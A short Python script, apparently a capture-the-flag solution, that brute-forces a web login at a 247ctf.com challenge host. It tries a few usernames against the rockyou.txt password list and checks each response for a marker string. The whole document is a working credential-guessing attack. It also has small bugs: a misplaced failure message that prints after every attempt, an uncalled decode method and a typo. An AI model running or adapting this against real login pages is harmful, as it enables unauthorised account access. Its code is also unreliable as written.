import requests
import sys

target = "https://2fa5d905d60bb0b0.247ctf.com/"
usernames = ["admin", "user", "password"]
passwords = "rockyou.txt"
needle = "Damn Vulnerable Web Application"

for username in usernames:
    with open(passwords, 'r') as password_list:
        for password in password_list:
            password = password.strip("\n").encode('latin-1')
            sys.stdout.write("[x] Attempting user:password -> {}:{}\r".format(username, password.decode()))
            r = requests.post(target, data={"username": username, "password": password})
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid passowrd '{}' found for user '{}'".format(password.decode, username))
                sys.exit()
            sys.stdout.flush()
            sys.stdout.write("\n")
            sys.stdout.write("\t No password found for '{}'".format(username))
